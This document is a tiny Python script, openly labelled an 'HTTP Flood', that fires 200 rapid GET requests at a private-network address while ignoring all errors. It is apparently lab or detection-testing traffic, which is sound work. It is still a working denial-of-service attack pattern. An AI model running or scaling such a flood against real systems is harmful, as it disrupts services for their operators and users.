import requests
import time

url = "http://10.5.0.20"

print("Starting HTTP Flood...")
for i in range(200):
    try:
        requests.get(url, timeout=0.2)
    except:
        pass
    time.sleep(0.01)

print("HTTP Flood Complete.")
